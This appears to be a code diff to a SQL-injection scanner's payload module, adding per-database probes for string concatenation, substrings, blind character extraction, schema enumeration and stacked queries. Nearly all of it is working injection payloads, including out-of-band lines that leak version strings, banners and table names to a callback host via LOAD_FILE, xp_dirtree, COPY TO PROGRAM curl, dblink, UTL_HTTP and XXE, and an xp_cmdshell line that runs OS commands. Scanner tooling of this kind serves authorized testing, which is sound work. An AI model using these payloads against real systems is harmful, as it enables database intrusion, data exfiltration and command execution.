@@ -44,6 +44,196 @@ def make_marker() -> str:
 
 
 # ---------------------------------------------------------------------------
+# String concatenation probes
+# Used to confirm SQLi by verifying the DB can concatenate strings.
+# A successful concat means the injected expression was evaluated by the DB.
+# Keys: per-DBMS concat syntax
+# ---------------------------------------------------------------------------
+
+CONCAT_PAYLOADS: dict[str, List[str]] = {
+    "mysql": [
+        # CONCAT() function — reflects 'foobar' if evaluated
+        "' AND 1=1 AND CONCAT('foo','bar')='foobar'-- -",
+        "' UNION SELECT CONCAT('foo','bar'),NULL-- -",
+        "' UNION SELECT CONCAT(0x666f6f,0x626172),NULL-- -",  # hex-encoded
+    ],
+    "mariadb": [
+        "' AND 1=1 AND CONCAT('foo','bar')='foobar'-- -",
+        "' UNION SELECT CONCAT('foo','bar'),NULL-- -",
+    ],
+    "mssql": [
+        # + operator for string concat
+        "' AND 1=1 AND 'foo'+'bar'='foobar'-- -",
+        "' UNION SELECT 'foo'+'bar',NULL-- -",
+        "'; SELECT 'foo'+'bar'-- -",
+    ],
+    "postgres": [
+        # || operator
+        "' AND 1=1 AND 'foo'||'bar'='foobar'-- -",
+        "' UNION SELECT 'foo'||'bar',NULL-- -",
+    ],
+    "sqlite": [
+        # || operator
+        "' AND 1=1 AND 'foo'||'bar'='foobar'-- -",
+        "' UNION SELECT 'foo'||'bar',NULL-- -",
+    ],
+    "oracle": [
+        # || operator, dual table required
+        "' AND 1=1 AND 'foo'||'bar'='foobar'-- -",
+        "' UNION SELECT 'foo'||'bar',NULL FROM dual-- -",
+    ],
+    "auto": [
+        # Try generic forms that work across most DBMSes
+        "' AND CONCAT('foo','bar')='foobar'-- -",
+        "' AND 'foo'||'bar'='foobar'-- -",
+        "' AND 'foo'+'bar'='foobar'-- -",
+    ],
+}
+
+
+# ---------------------------------------------------------------------------
+# Substring probes (used in blind data extraction)
+# These probe whether SUBSTRING/SUBSTR is available and functional.
+# Keys: per-DBMS substring syntax
+# ---------------------------------------------------------------------------
+
+SUBSTRING_PROBES: dict[str, List[str]] = {
+    "mysql": [
+        # SUBSTRING('foobar', 4, 2) = 'ba'
+        "' AND SUBSTRING('foobar',4,2)='ba'-- -",
+        "' AND MID('foobar',4,2)='ba'-- -",
+    ],
+    "mariadb": [
+        "' AND SUBSTRING('foobar',4,2)='ba'-- -",
+    ],
+    "mssql": [
+        "' AND SUBSTRING('foobar',4,2)='ba'-- -",
+    ],
+    "postgres": [
+        "' AND SUBSTRING('foobar',4,2)='ba'-- -",
+    ],
+    "sqlite": [
+        "' AND SUBSTR('foobar',4,2)='ba'-- -",
+    ],
+    "oracle": [
+        "' AND SUBSTR('foobar',4,2)='ba'-- -",
+    ],
+    "auto": [
+        "' AND SUBSTRING('foobar',4,2)='ba'-- -",
+        "' AND SUBSTR('foobar',4,2)='ba'-- -",
+    ],
+}
+
+
+def get_concat_payloads(dbms: str) -> List[str]:
+    """Return string concatenation probe payloads for *dbms*."""
+    return CONCAT_PAYLOADS.get(dbms, CONCAT_PAYLOADS["auto"])
+
+
+def get_substring_probes(dbms: str) -> List[str]:
+    """Return substring probe payloads for *dbms*."""
+    return SUBSTRING_PROBES.get(dbms, SUBSTRING_PROBES["auto"])
+
+
+def make_substring_payload(dbms: str, expr: str, pos: int, char: str) -> str:
+    """
+    Build a boolean-blind payload that checks whether the character at position
+    *pos* (1-based) in the SQL expression *expr* equals *char*.
+
+    Returns a true/false payload pair suitable for boolean-blind extraction.
+    The returned string is the TRUE payload; swap the char to get the FALSE one.
+    """
+    substr_fn = "SUBSTR" if dbms in ("sqlite", "oracle") else "SUBSTRING"
+    char_hex = hex(ord(char))  # e.g. 0x41 for 'A'
+    # Use ASCII()/ORD() to avoid quoting issues with special chars
+    ord_fn = "ASCII" if dbms in ("mysql", "mariadb", "mssql", "sqlite") else "ASCII"
+    if dbms == "postgres":
+        ord_fn = "ASCII"
+    return f"' AND {ord_fn}({substr_fn}(({expr}),{pos},1))={ord(char)}-- -"
+
+
+# ---------------------------------------------------------------------------
+# Database contents enumeration payloads
+# Query information_schema / system catalogs to list tables and columns.
+# ---------------------------------------------------------------------------
+
+DB_CONTENTS_PAYLOADS: dict[str, dict[str, List[str]]] = {
+    "mysql": {
+        "tables": [
+            "' AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1) AS SIGNED)-- -",
+            "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()-- -",
+            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1)))-- -",
+        ],
+        "columns": [
+            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_schema=database() LIMIT 1)))-- -",
+            "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='TARGET_TABLE'-- -",
+        ],
+    },
+    "mariadb": {
+        "tables": [
+            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1)))-- -",
+            "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()-- -",
+        ],
+        "columns": [
+            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_schema=database() LIMIT 1)))-- -",
+        ],
+    },
+    "mssql": {
+        "tables": [
+            "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))-- -",
+            "' UNION SELECT TOP 1 table_name,NULL FROM information_schema.tables-- -",
+            "'; SELECT name FROM sysobjects WHERE xtype='U'-- -",
+        ],
+        "columns": [
+            "' AND 1=CONVERT(int,(SELECT TOP 1 column_name FROM information_schema.columns))-- -",
+            "' UNION SELECT TOP 1 column_name,NULL FROM information_schema.columns WHERE table_name='TARGET_TABLE'-- -",
+        ],
+    },
+    "postgres": {
+        "tables": [
+            "' AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1) AS int)-- -",
+            "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'-- -",
+            "' AND 1=CAST((SELECT tablename FROM pg_tables WHERE schemaname='public' LIMIT 1) AS int)-- -",
+        ],
+        "columns": [
+            "' AND 1=CAST((SELECT column_name FROM information_schema.columns WHERE table_schema='public' LIMIT 1) AS int)-- -",
+            "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='TARGET_TABLE'-- -",
+        ],
+    },
+    "sqlite": {
+        "tables": [
+            "' AND 1=CAST((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1) AS INTEGER)-- -",
+            "' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'-- -",
+        ],
+        "columns": [
+            # SQLite PRAGMA — needs stacked queries or creative injection
+            "' UNION SELECT sql,NULL FROM sqlite_master WHERE type='table' AND name='TARGET_TABLE'-- -",
+        ],
+    },
+    "oracle": {
+        "tables": [
+            "' AND 1=CAST((SELECT table_name FROM all_tables WHERE rownum=1) AS INTEGER)-- -",
+            "' UNION SELECT table_name,NULL FROM all_tables WHERE rownum=1-- -",
+            "' AND 1=CAST((SELECT table_name FROM user_tables WHERE rownum=1) AS INTEGER)-- -",
+        ],
+        "columns": [
+            "' AND 1=CAST((SELECT column_name FROM all_tab_columns WHERE rownum=1) AS INTEGER)-- -",
+            "' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='TARGET_TABLE' AND rownum=1-- -",
+        ],
+    },
+}
+
+
+def get_db_contents_payloads(dbms: str, target: str = "tables") -> List[str]:
+    """Return database contents enumeration payloads for *dbms*.
+
+    *target* is either ``"tables"`` or ``"columns"``.
+    """
+    db_map = DB_CONTENTS_PAYLOADS.get(dbms, {})
+    return db_map.get(target, [])
+
+
+# ---------------------------------------------------------------------------
 # Error-based payloads
 # Keys: "generic", "mysql", "mariadb", "mssql", "postgres", "sqlite", "oracle"
 # ---------------------------------------------------------------------------
@@ -374,27 +564,54 @@ def union_null_probes(col_count: int, marker: str) -> List[str]:
 
 OOB_PAYLOADS: dict[str, List[str]] = {
     "mysql": [
+        # DNS lookup (triggers DNS resolution of the callback hostname)
+        "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\','{callback}','\\\\a'))--",
+        "' AND (SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,'{callback}',0x5c61)))--",
+        # DNS lookup + data exfiltration (VERSION() embedded in subdomain)
         "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',VERSION(),'.{callback}\\\\a'))--",
         "' AND (SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,VERSION(),0x2e,'{callback}',0x5c61)))--",
     ],
+    "mariadb": [
+        # MariaDB supports the same LOAD_FILE UNC-path DNS trick as MySQL
+        "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\','{callback}','\\\\a'))--",
+        # DNS + data exfiltration
+        "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',VERSION(),'.{callback}\\\\a'))--",
+    ],
     "mssql": [
+        # DNS lookup
         "'; EXEC master..xp_dirtree '//{callback}/a'--",
         "'; EXEC master..xp_fileexist '//{callback}/a'--",
-        "' UNION SELECT NULL,NULL; EXEC master..xp_dirtree '//{callback}/a'--",
+        # DNS lookup + data exfiltration (@@version embedded in UNC path hostname)
+        "'; DECLARE @v varchar(1024);SET @v=(SELECT @@version);EXEC('master..xp_dirtree \"//'+@v+'.{callback}/a\"')--",
+        "'; DECLARE @p varchar(1024);SET @p=(SELECT TOP 1 table_name FROM information_schema.tables);EXEC('master..xp_dirtree \"//'+@p+'.{callback}/a\"')--",
     ],
     "postgres": [
-        "'; COPY (SELECT version()) TO PROGRAM 'curl http://{callback}'--",
+        # DNS lookup via dblink
         "' AND (SELECT dblink_send_query('host={callback}','SELECT 1'))--",
+        # DNS lookup via COPY/curl
+        "'; COPY (SELECT '') TO PROGRAM 'nslookup {callback}'--",
+        # DNS lookup + data exfiltration (version embedded in curl URL subdomain)
+        "'; DO $$DECLARE c text; BEGIN SELECT version() INTO c; EXECUTE 'COPY (SELECT '''') TO PROGRAM ''curl http://''||c||''.{callback}'''; END$$--",
+        # Simpler exfil using dblink with data in host
+        "'; CREATE OR REPLACE FUNCTION f() RETURNS void AS $f$ DECLARE v text; BEGIN SELECT version() INTO v; PERFORM dblink_send_query(''host=''||v||''.{callback}'',''SELECT 1''); END; $f$ LANGUAGE plpgsql; SELECT f()--",
     ],
     "sqlite": [],  # SQLite has no native OOB capability
     "oracle": [
-        "' UNION SELECT UTL_HTTP.REQUEST('http://{callback}') FROM dual-- -",
+        # DNS lookup
+        "' UNION SELECT UTL_HTTP.REQUEST('http://{callback}/') FROM dual-- -",
         "' AND 1=(SELECT UTL_HTTP.REQUEST('http://{callback}/') FROM dual)-- -",
+        # DNS lookup + data exfiltration (banner/version embedded in URL)
+        "' UNION SELECT UTL_HTTP.REQUEST('http://'||(SELECT UTL_RAW.CAST_TO_VARCHAR2(UTL_ENCODE.BASE64_ENCODE(UTL_RAW.CAST_TO_RAW(banner))) FROM v$version WHERE rownum=1)||'.{callback}/') FROM dual-- -",
+        # Simpler exfil via UTL_INADDR DNS lookup with data in hostname
+        "' AND 1=(SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1)||'.{callback}') FROM dual)-- -",
+        # XXE-based DNS lookup (unpatched Oracle)
+        "' UNION SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://{callback}/\"> %remote;]>'),'/l') FROM dual-- -",
     ],
     "auto": [
         "'; EXEC master..xp_dirtree '//{callback}/a'--",
         "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',VERSION(),'.{callback}\\\\a'))--",
-        "'; COPY (SELECT version()) TO PROGRAM 'curl http://{callback}'--",
+        "'; COPY (SELECT '') TO PROGRAM 'nslookup {callback}'--",
+        "' AND 1=(SELECT UTL_HTTP.REQUEST('http://{callback}/') FROM dual)-- -",
     ],
 }
 
@@ -501,3 +718,58 @@ def get_oob_payloads(dbms: str, callback: str) -> List[str]:
     hostname = parsed.netloc or parsed.path or callback
     raw = OOB_PAYLOADS.get(dbms, OOB_PAYLOADS["auto"])
     return [p.format(callback=hostname) for p in raw]
+
+
+# ---------------------------------------------------------------------------
+# Stacked (batched) query payloads
+# These inject a second query after the primary one using a semicolon.
+# Not all databases or frameworks support stacked queries via their API.
+# Oracle does NOT support stacked queries at all.
+# ---------------------------------------------------------------------------
+
+STACKED_PAYLOADS: dict[str, List[str]] = {
+    "mysql": [
+        # Stacked queries work in MySQL only with certain PHP/Python APIs
+        "'; SELECT SLEEP(0)-- -",
+        "'; SELECT 1-- -",
+        "'; SELECT VERSION()-- -",
+    ],
+    "mariadb": [
+        "'; SELECT SLEEP(0)-- -",
+        "'; SELECT VERSION()-- -",
+    ],
+    "mssql": [
+        # MSSQL fully supports stacked queries
+        "'; SELECT 1-- -",
+        "'; SELECT @@version-- -",
+        "'; SELECT name FROM sysobjects WHERE xtype='U'-- -",
+        "'; WAITFOR DELAY '0:0:0'-- -",
+        # Risk 3: execute OS commands
+        "'; EXEC xp_cmdshell('whoami')-- -",
+    ],
+    "postgres": [
+        "'; SELECT 1-- -",
+        "'; SELECT version()-- -",
+        "'; SELECT current_database()-- -",
+        "'; SELECT tablename FROM pg_tables WHERE schemaname='public' LIMIT 1-- -",
+    ],
+    "sqlite": [
+        # SQLite supports multiple statements in some drivers
+        "'; SELECT sqlite_version()-- -",
+        "'; SELECT name FROM sqlite_master WHERE type='table' LIMIT 1-- -",
+    ],
+    "oracle": [],  # Oracle does NOT support stacked queries
+    "auto": [
+        "'; SELECT 1-- -",
+        "'; SELECT version()-- -",
+        "'; WAITFOR DELAY '0:0:0'-- -",
+    ],
+}
+
+
+def get_stacked_payloads(dbms: str, risk: int) -> List[str]:
+    """Return stacked query payloads for *dbms* filtered by *risk* level."""
+    raw = STACKED_PAYLOADS.get(dbms, STACKED_PAYLOADS["auto"])
+    if risk < 3:
+        raw = [p for p in raw if "xp_cmdshell" not in p.lower()]
+    return raw
